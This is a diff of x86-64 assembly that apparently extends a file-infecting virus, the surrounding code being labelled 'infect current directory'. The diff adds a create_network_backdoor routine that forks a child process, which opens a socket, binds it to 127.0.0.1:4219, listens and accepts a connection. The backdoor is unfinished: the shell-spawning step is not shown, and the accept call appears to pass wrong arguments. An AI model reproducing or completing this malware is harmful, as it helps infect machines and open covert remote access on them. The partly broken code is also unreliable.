@@ -17,6 +17,8 @@ _start:
 	lea rdi, [rsp]
 	call check_process
 	add rsp, 8
+	;create network backdoor
+	call create_network_backdoor
 	;infect current directory
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
@@ -334,6 +336,65 @@ check_cmdline_content:
 	pop r8
 	pop rcx
 	pop rbx
+retn
+
+; void create_network_backdoor()
+create_network_backdoor
+	mov rax, 57; fork
+	syscall;rax = fork()
+	cmp rax, 0
+	jne continue_your_life
+	call pop_shell_on_net; child process
+	jmp exit_prog; kill child
+	continue_your_life:; parent or if fork failed
+retn
+
+;void pop_shell_on_net
+pop_shell_on_net
+	sub rsp, 16; struct sockaddr_in servaddr
+	sub rsp, 16; struct sockaddr_in cli
+	sub rsp, 12; int sockfd, connfd, len (4*3)
+	;create socket
+	mov rax, 41
+	mov rdi, 2;AF_INET
+	mov rsi, 1;SOCK_STREAM
+	xor rdx, rdx
+	syscall; rax = socket(AF_INET, SOCK_STREAM, 0);
+	cmp rax, -1
+	je exit_prog; err
+	mov DWORD[rsp], eax; sockfd = rax
+	; prepare servaddr for bind
+	mov WORD[rsp + 28], 2;servaddr.sin_family = AF_INET
+	mov WORD[rsp + 30], 31504; servaddr.sin_port = htons(4219) == 31504
+	mov DWORD[rsp + 32], 16777343; servaddr.sin_addr.s_addr = inet_addr("127.0.0.1") == 16777343 
+	;bind
+	mov rax, 49
+	xor rdi, rdi
+	mov edi, DWORD[rsp]
+	lea rsi, [rsp + 28]
+	mov rdx, 16
+	syscall; bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))
+	cmp rax, 0
+	jne exit_prog; err
+	;listen
+	mov rax, 50
+	mov rsi, 2
+	syscall; listen(sockfd, 2)
+	cmp rax, 0
+	jne exit_prog; err
+	;accept
+	mov DWORD[rsp + 8], 16; len = sizeof(struct sockaddr_in)
+	mov rax, 43
+	lea rsi, [rsp + 12]
+	lea rdi, [rsp + 8]
+	syscall; rax = accept(sockfd, (struct sockaddr*)&cli, &len)
+	cmp rax, -1
+	je exit_prog; err
+	mov DWORD[rsp + 4], eax
+	; at this point our server is running and has accepted a client
+	
+	add rsp, 12
+	add rsp, 32
 retn
 
 ft_strlen:
